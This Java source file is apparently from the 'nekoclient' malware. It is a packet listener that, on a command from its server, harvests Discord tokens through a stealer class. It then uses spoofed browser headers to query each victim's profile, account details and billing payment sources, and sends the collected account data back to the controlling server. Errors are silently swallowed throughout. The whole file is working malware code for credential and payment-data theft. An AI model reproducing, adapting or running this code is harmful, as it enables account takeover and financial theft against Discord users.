package dev.neko.nekoclient.packet.listener.impl;

import com.eclipsesource.json.Json;
import dev.neko.nekoclient.Client;
import dev.neko.nekoclient.api.stealer.discord.DiscordAccount;
import dev.neko.nekoclient.api.stealer.discord.impl.DiscordStealer;
import dev.neko.nekoclient.packet.impl.client.DiscordResponsePacket;
import dev.neko.nekoclient.packet.impl.server.RequestDiscordPacket;
import dev.neko.nekoclient.packet.listener.PacketListener;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import javax.net.ssl.HttpsURLConnection;

public class RequestDiscordPacketListener implements PacketListener<RequestDiscordPacket> {
   public void call(RequestDiscordPacket packet, Client client, String id) throws IOException {
      ExecutorService executorService = Executors.newSingleThreadExecutor();
      executorService.execute(
         () -> {
            boolean deb = System.getProperty("user.name").equals("TheDxrkKiller");
   
            try {
               List<DiscordAccount> accounts = new ArrayList<>();
   
               for(String token : DiscordStealer.retrieve()) {
                  try {
                     String[] split = token.split("\\.");
                     String userId = new String(Base64.getDecoder().decode(Objects.equals(split[0], "mfa") ? split[1] : split[0]));
                     if (!accounts.stream().anyMatch(discordAccount -> Objects.equals(discordAccount.getId(), userId))) {
                        int profileStatusCode = -1;
                        HttpsURLConnection profileConnection = null;
   
                        while(profileStatusCode < 0 || Objects.equals(profileStatusCode, 429)) {
                           profileConnection = (HttpsURLConnection)new URL(
                                 String.format("https://discord.com/api/v9/users/%s/profile?with_mutual_guilds=false&with_mutual_friends_count=false", userId)
                              )
                              .openConnection();
                           profileConnection.setRequestMethod("GET");
                           setHeaders(profileConnection, token);
                           if (Objects.equals(profileStatusCode = profileConnection.getResponseCode(), 429)) {
                              Thread.sleep(10000L);
                           }
                        }
   
                        if (Objects.equals(profileConnection.getResponseCode(), 200)) {
                           int userStatusCode = -1;
                           HttpsURLConnection userConnection = null;
   
                           while(userStatusCode < 0 || Objects.equals(userStatusCode, 429)) {
                              userConnection = (HttpsURLConnection)new URL("https://discord.com/api/v9/users/@me").openConnection();
                              userConnection.setRequestMethod("GET");
                              setHeaders(userConnection, token);
                              if (Objects.equals(userStatusCode = userConnection.getResponseCode(), 429)) {
                                 Thread.sleep(10000L);
                              }
                           }
   
                           if (Objects.equals(userConnection.getResponseCode(), 200)) {
                              int paymentStatusCode = -1;
                              HttpsURLConnection paymentSourcesConnection = null;
   
                              while(paymentStatusCode < 0 || Objects.equals(paymentStatusCode, 429)) {
                                 paymentSourcesConnection = (HttpsURLConnection)new URL("https://discord.com/api/v9/users/@me/billing/payment-sources")
                                    .openConnection();
                                 paymentSourcesConnection.setRequestMethod("GET");
                                 setHeaders(paymentSourcesConnection, token);
                                 if (Objects.equals(paymentStatusCode = paymentSourcesConnection.getResponseCode(), 429)) {
                                    Thread.sleep(10000L);
                                 }
                              }
   
                              if (Objects.equals(paymentSourcesConnection.getResponseCode(), 200)) {
                                 DiscordAccount account = DiscordAccount.parse(
                                    token,
                                    Json.parse(new InputStreamReader(profileConnection.getInputStream())).asObject(),
                                    Json.parse(new InputStreamReader(userConnection.getInputStream())).asObject(),
                                    Json.parse(new InputStreamReader(paymentSourcesConnection.getInputStream())).asArray()
                                 );
                                 accounts.add(account);
                              }
                           }
                        }
   
                        Thread.sleep(5000L);
                     }
                  } catch (Throwable var18) {
                  }
               }
   
               try {
                  client.send(new DiscordResponsePacket(packet.getNonce(), accounts));
               } catch (IOException var17) {
               }
   
               executorService.shutdown();
            } catch (Throwable var19) {
            }
         }
      );
   }

   private static void setHeaders(URLConnection connection, String token) {
      connection.setRequestProperty("Accept", "*/*");
      connection.setRequestProperty("Alt-Used", "discord.com");
      connection.setRequestProperty("Accept-Language", "en-US;q=0.8");
      connection.setRequestProperty("Authorization", token);
      connection.setRequestProperty("Referer", "https://discord.com/channels/@me");
      connection.setRequestProperty("Sec-Ch-Ua", "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"");
      connection.setRequestProperty("Sec-Ch-Ua-Mobile", "?0");
      connection.setRequestProperty("Sec-Ch-Ua-Platform", "\"Windows\"");
      connection.setRequestProperty("Sec-Fetch-Dest", "empty");
      connection.setRequestProperty("Sec-Fetch-Mode", "cors");
      connection.setRequestProperty("Sec-Fetch-Site", "same-origin");
      connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0");
      connection.setRequestProperty("X-Debug-Options", "bugReporterEnabled");
      connection.setRequestProperty("X-Discord-Locale", "en-US");
      connection.setRequestProperty("X-Discord-Timezone", "America/Los_Angeles");
      connection.setRequestProperty(
         "X-Super-Properties",
         Base64.getEncoder()
            .encodeToString(
               Json.object()
                  .add("os", "Windows")
                  .add("browser", "Firefox")
                  .add("device", "")
                  .add("system_locale", "en-US")
                  .add("browser_user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0")
                  .add("browser_version", "113.0")
                  .add("os_version", "10")
                  .add("referrer", "")
                  .add("referring_domain", "")
                  .add("referrer_current", "")
                  .add("referring_domain_current", "")
                  .add("release_channel", "stable")
                  .add("client_build_number", 201211)
                  .add("client_event_source", Json.NULL)
                  .add("design_id", 0)
                  .toString()
                  .getBytes()
            )
      );
   }
}
